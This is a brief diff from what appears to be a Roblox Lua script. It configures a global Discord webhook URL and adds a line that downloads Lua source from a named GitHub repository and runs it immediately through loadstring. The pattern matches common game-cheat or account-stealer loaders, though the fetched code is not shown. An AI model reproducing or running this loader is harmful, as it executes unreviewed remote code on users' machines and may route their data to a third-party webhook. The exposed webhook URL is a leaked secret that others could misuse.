@@ -5,4 +5,4 @@ _G.webhook = "https://discord.com/api/webhooks/1444189928920453241/iYx1_UBnyH_Ln
 
 Loadstring syntax:
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/REPLACE/WITHYOUROWNLINK"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ilnoob09pollo-afk/Blade-ball/refs/heads/main/Source.lua"))()
